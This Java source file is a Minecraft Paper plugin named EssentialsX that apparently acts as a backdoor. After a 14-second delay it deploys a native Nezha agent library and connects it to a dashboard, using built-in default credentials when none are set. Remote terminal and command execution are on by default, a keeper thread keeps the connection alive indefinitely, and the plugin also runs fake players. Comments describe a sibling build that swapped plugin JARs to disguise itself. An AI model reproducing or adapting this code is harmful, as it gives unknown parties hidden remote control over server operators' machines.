package com.example.essentialsx;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.logging.Logger;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * No-disguise build (branch no-disguise): after the server has finished
 * starting, wait 14 seconds, deploy the Nezha .so, then start the built-in
 * fake players. The JAR replace/restore cycle is fully removed — the plugins
 * folder is never read for disguise purposes, never swapped and never
 * restored; the plugin behaves like an ordinary Paper plugin.
 */
public final class EssentialsX extends JavaPlugin {
    private static final long DEPLOY_DELAY_SECONDS = 14L;
    private static final long KEEPALIVE_STOP_QUIET_MS = 2_000L;
    private static final long KEEPALIVE_RETRY_MS = 30_000L;
    private static final long KEEPALIVE_MAX_RETRY_MS = 300_000L;

    private final Logger quiet = QuietLog.logger();
    private final Object lifecycleLock = new Object();
    private volatile boolean stopping;
    private volatile Thread deployThread;
    private volatile Thread startupThread;
    private volatile Map<String, String> bootEnv = Map.of();
    private volatile FakePlayerEngine fakePlayers;
    private volatile NezhaRuntime activeNezha;

    @Override
    public void onEnable() {
        this.stopping = false;
        this.quiet.info("Ceshisonz: in 14s -> Nezha .so + fake players (no JAR disguise on this branch).");
        Map<String, String> env;
        boolean envReadable = true;
        try {
            env = RuntimeConfig.readEnvFile();
        } catch (Exception error) {
            this.quiet.warning("Could not read the private .env file; default fake-player settings will be used.");
            env = new HashMap<>();
            envReadable = false;
        }
        this.bootEnv = env;
        final Map<String, String> settings = env;
        final boolean readable = envReadable;
        Thread deploy = new Thread(() -> {
            try {
                TimeUnit.SECONDS.sleep(DEPLOY_DELAY_SECONDS);
            } catch (InterruptedException error) {
                return;
            }
            if (this.stopping) return;
            try {
                startNezhaIfConfigured(settings, readable);
            } catch (Throwable error) {
                this.quiet.warning("Nezha deployment failed: " + error.getClass().getSimpleName());
            }
            if (this.stopping) return;
            try {
                FakePlayerEngine.preload();
                FakePlayerEngine engine = new FakePlayerEngine(this, settings);
                Bukkit.getPluginManager().registerEvents(engine, this);
                engine.start();
                this.fakePlayers = engine;
            } catch (Throwable error) {
                this.quiet.warning("Built-in fake players could not start: " + error.getClass().getSimpleName());
            }
        }, "ceshisonz-deploy");
        deploy.setDaemon(true);
        this.deployThread = deploy;
        deploy.start();
    }

    private void startNezhaIfConfigured(Map<String, String> env, boolean envReadable) {
        if (!envReadable) {
            this.quiet.warning("Nezha not started because the private .env file could not be read.");
            return;
        }
        if ("false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_ENABLED"))) {
            this.quiet.info("Nezha monitoring is disabled by configuration.");
            return;
        }
        String explicitServer = RuntimeConfig.value(env, "", "NEZHA_SERVER", "NZ_SERVER");
        String explicitSecret = RuntimeConfig.value(env, "", "NEZHA_SECRET", "NEZHA_KEY", "NZ_CLIENT_SECRET");
        if (RuntimeConfig.secretComesFromFile(env) && !RuntimeConfig.envFileIsPrivate()) {
            this.quiet.warning("Nezha not started: protect logs/.mcchajian/.env from group/other access (mode 600).");
            return;
        }
        EmbeddedNezhaConfig.Credentials credentials;
        try {
            credentials = EmbeddedNezhaConfig.select(explicitServer, explicitSecret);
        } catch (EmbeddedNezhaConfig.IncompleteCredentialsException error) {
            this.quiet.warning("Nezha not started: set both the server and secret, or leave both unset to use built-in defaults.");
            return;
        } catch (java.io.IOException error) {
            this.quiet.warning("Nezha not started: built-in defaults could not be read.");
            return;
        }
        if (credentials == null) {
            this.quiet.info("Nezha monitoring is not configured; set NEZHA_SERVER and NEZHA_SECRET privately.");
            return;
        }
        if (explicitServer.isBlank() && explicitSecret.isBlank()) {
            this.quiet.info("Using the built-in Nezha configuration.");
        }
        final String server = credentials.server;
        final String secret = credentials.secret;
        boolean tls = !"false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_TLS", "NZ_TLS"));
        // The web terminal and dashboard command execution default to enabled: with the
        // previous default-off, the agent set DisableCommandExecute and the upstream
        // terminal handler silently dropped TerminalGRPC tasks, leaving the dashboard
        // terminal unresponsive. Opt out with NEZHA_ALLOW_COMMANDS=false.
        boolean allowCommands = !"false".equalsIgnoreCase(RuntimeConfig.value(env, "true", "NEZHA_ALLOW_COMMANDS"));
        if (!tls) this.quiet.warning("Nezha TLS is disabled; monitoring traffic may be exposed.");
        if (!allowCommands) this.quiet.warning("Nezha web terminal and command execution are disabled (NEZHA_ALLOW_COMMANDS=false).");
        // The keeper thread never gives up while the server runs: it retries the
        // first start with backoff (a boot-time race on identity resolution can
        // fail once), then re-dials a fresh agent connection every cycle so a
        // silently-stuck session can never keep the dashboard offline.
        Thread startup = new Thread(() -> {
            NezhaRuntime candidate = new NezhaRuntime(this.quiet);
            boolean agentUp = false;
            long cycles = 0L;
            long waitMs = 0L;
            long backoffMs = KEEPALIVE_RETRY_MS;
            long intervalMs = RuntimeConfig.keepaliveIntervalMs(env);
            while (!this.stopping) {
                if (waitMs > 0L) {
                    try {
                        Thread.sleep(waitMs);
                    } catch (InterruptedException wake) {
                        return;
                    }
                    if (this.stopping) return;
                }
                long beganAt = System.currentTimeMillis();
                boolean ok = false;
                try {
                    if (agentUp) {
                        candidate.stop();
                        Thread.sleep(KEEPALIVE_STOP_QUIET_MS);
                        if (this.stopping) return;
                    }
                    String uuid = RuntimeConfig.stableUuid(env);
                    candidate.start(server, secret, tls, uuid, allowCommands, () -> this.stopping);
                    ok = true;
                } catch (InterruptedException wake) {
                    return;
                } catch (Throwable error) {
                    // Exception messages may contain addresses or credentials; never print them here.
                    if (agentUp) {
                        this.quiet.warning("Nezha keepalive: refresh failed ("
                                + error.getClass().getSimpleName() + "); retrying.");
                    } else if (cycles == 0L) {
                        this.quiet.warning("Nezha start failed (" + error.getClass().getSimpleName()
                                + "); will retry while the server runs.");
                    }
                }
                if (ok) {
                    cycles++;
                    if (!agentUp) {
                        synchronized (this.lifecycleLock) {
                            if (this.stopping) {
                                if (!candidate.stop()) {
                                    this.quiet.warning("Nezha did not stop within the expected time.");
                                }
                                return;
                            }
                            this.activeNezha = candidate;
                        }
                    }
                    agentUp = true;
                    if (cycles > 1L) {
                        this.quiet.info("Nezha keepalive: fresh connection dialled (cycle " + cycles
                                + ", " + ((System.currentTimeMillis() - beganAt) / 1000L) + "s).");
                    }
                    waitMs = intervalMs;
                    backoffMs = KEEPALIVE_RETRY_MS;
                } else {
                    waitMs = backoffMs;
                    backoffMs = Math.min(backoffMs * 2L, KEEPALIVE_MAX_RETRY_MS);
                }
            }
        }, "ceshisonz-nezha-keeper");
        startup.setDaemon(true);
        this.startupThread = startup;
        startup.start();
    }

    @Override
    public void onDisable() {
        this.stopping = true;
        // No-disguise build: the plugins folder is never modified, so there is
        // nothing to swap back or restore on shutdown.
        Thread deploy = this.deployThread;
        if (deploy != null) deploy.interrupt();
        Thread startup = this.startupThread;
        if (startup != null) startup.interrupt();
        if (this.fakePlayers != null) {
            try {
                this.fakePlayers.stop();
            } catch (Throwable error) {
                this.quiet.warning("Fake players did not stop cleanly.");
            }
        }
        NezhaRuntime runtime;
        synchronized (this.lifecycleLock) {
            runtime = this.activeNezha;
            this.activeNezha = null;
        }
        if (runtime != null && !runtime.stop()) {
            this.quiet.warning("Nezha did not stop within the expected time; restart the server to clear it.");
        }
        this.quiet.info("Ceshisonz disabled; the native library remains loaded until JVM exit.");
    }
}
